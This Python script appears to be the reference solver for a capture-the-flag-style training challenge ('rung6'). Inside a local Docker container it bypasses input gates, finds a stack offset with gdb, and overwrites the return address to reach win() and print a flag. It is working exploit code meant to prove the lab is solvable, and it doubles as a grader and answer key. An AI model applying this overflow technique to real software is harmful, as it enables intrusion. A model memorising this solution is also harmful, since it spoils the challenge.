#!/usr/bin/env python3
"""Known-good exploit for rung6 (constrained ret2win) — proof of solvability.

Drives a live enigma-homework container from the HOST via docker exec.
The gates (arvo_63746 shape): line must start with "PWN6"; ',' and '@' are
rejected; the overflow rides sscanf %s, so the payload is a C string —
whitespace ends the conversion and the first NUL truncates the line. A
single address still survives: win < 0x1000000, so p32(win)'s 3 significant
bytes land in the return slot, the injected NUL stops the conversion, and
%s's own terminating NUL plus the slot's original zero high bytes complete
a clean pointer. Offset from gdb on a header-prefixed cyclic pattern
(expect 60, NOT 40 — vuln's dead FILE* local sits between tail and rbp).

Usage: python3 solve_rung6.py <container_id_or_name>
Exit code 0 on PASS, 1 on FAIL.
"""
import json
import os
import re
import struct
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))

HEADER = b"PWN6"


def docker_exec(cid, cmd, input_bytes=None, timeout=120):
    return subprocess.run(["docker", "exec", "-i", cid] + cmd,
                          input=input_bytes, capture_output=True,
                          timeout=timeout)


def cyclic(n, subseq=4):
    k = 26
    alphabet = [chr(ord('a') + i) for i in range(k)]
    a = [0] * (k * subseq)
    seq = []

    def db(t, p):
        if t > subseq:
            if subseq % p == 0:
                seq.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    return "".join(alphabet[i] for i in seq).encode()[:n]


def discover_offset(cid, binary, fallback=60):
    """Offset from line start to the saved retaddr. The crash pattern must
    carry the PWN6 magic or the binary exits at the gate instead."""
    pat = HEADER + cyclic(256)
    docker_exec(cid, ["bash", "-c", "cat > /tmp/pat.bin"], input_bytes=pat)
    r = docker_exec(cid, ["gdb", "-q", "-batch",
                          "-ex", "run /tmp/pat.bin",
                          "-ex", "info registers rip",
                          "-ex", "x/1gx $rsp",
                          binary])
    body = pat[len(HEADER):]
    m = re.search(rb"rip\s+(0x[0-9a-f]+)", r.stdout)
    if m:
        rip = int(m.group(1), 16)
        off = body.find(struct.pack("<Q", rip)[:4])
        if off >= 0:
            print("[*] crash rip = 0x%x -> offset %d" % (rip, off))
            return off + len(HEADER)
    m = re.search(rb"0x[0-9a-f]+:\s+(0x[0-9a-f]+)", r.stdout)
    if m:
        slot = int(m.group(1), 16)
        off = body.find(struct.pack("<Q", slot))
        if off >= 0:
            print("[*] non-canonical ret; slot @rsp = 0x%x -> offset %d"
                  % (slot, off + len(HEADER)))
            return off + len(HEADER)
    print("[!] gdb offset inconclusive, fallback %d" % fallback)
    return fallback


def solve(cid):
    expected = json.load(open(os.path.join(HERE, "flags.json")))["rung6"]

    # 0. The gates: no magic -> reject; reserved separator -> reject.
    r = docker_exec(cid, ["bash", "-c", "printf 'AAAAAAAA' > /tmp/bad.bin && /target/rung6 /tmp/bad.bin"])
    if b"bad magic" not in r.stdout:
        print("FAIL: magic gate did not reject:\n" + r.stdout.decode(errors="replace"))
        return False
    r = docker_exec(cid, ["bash", "-c", "printf 'PWN6AA,AA' > /tmp/bad2.bin && /target/rung6 /tmp/bad2.bin"])
    if b"bad char" not in r.stdout:
        print("FAIL: separator gate did not reject:\n" + r.stdout.decode(errors="replace"))
        return False
    print("[*] gates verified: no-magic -> 'bad magic', comma -> 'bad char'")

    # 1. win() address; must fit in 3 bytes with no bad bytes.
    r = docker_exec(cid, ["nm", "/target/rung6"])
    m = re.search(rb"^([0-9a-f]+) [Tt] win$", r.stdout, re.M)
    if not m:
        print("FAIL: win not found:\n" + r.stdout.decode(errors="replace"))
        return False
    win_addr = int(m.group(1), 16)
    if win_addr > 0xFFFFFF:
        print("FAIL: win 0x%x does not fit in 3 bytes (bad link base?)" % win_addr)
        return False
    bad = set(b"\x00\x20\x09\x0a\x0b\x0c\x0d\x2c\x40")
    low3 = win_addr.to_bytes(8, "little")[:3]
    if any(b in bad for b in low3):
        print("FAIL: win 0x%x contains a bad byte" % win_addr)
        return False
    print("[*] win @ 0x%x (3 clean bytes: %s)" % (win_addr, low3.hex()))

    # 2. Offset (header-prefixed pattern; expect 60).
    offset = discover_offset(cid, "/target/rung6")

    # 3. Deliver: magic + padding + p32(win). The p32 NUL truncates the
    # string right after the 3 address bytes — that is the trick, not a bug.
    payload = HEADER + b"A" * (offset - len(HEADER)) + struct.pack("<I", win_addr)
    docker_exec(cid, ["bash", "-c", "cat > /tmp/payload.bin"], input_bytes=payload)
    r = docker_exec(cid, ["/target/rung6", "/tmp/payload.bin"])
    out = r.stdout
    print("[*] target output:\n" + out.decode(errors="replace").strip())

    got = re.search(rb"flag\{[^}]*\}", out)
    if got and got.group(0).decode() == expected:
        print("PASS: rung6 solved, flag matches flags.json: %s" % expected)
        return True
    print("FAIL: expected %s, got %s"
          % (expected, got.group(0).decode() if got else None))
    return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(__doc__)
        sys.exit(2)
    sys.exit(0 if solve(sys.argv[1]) else 1)
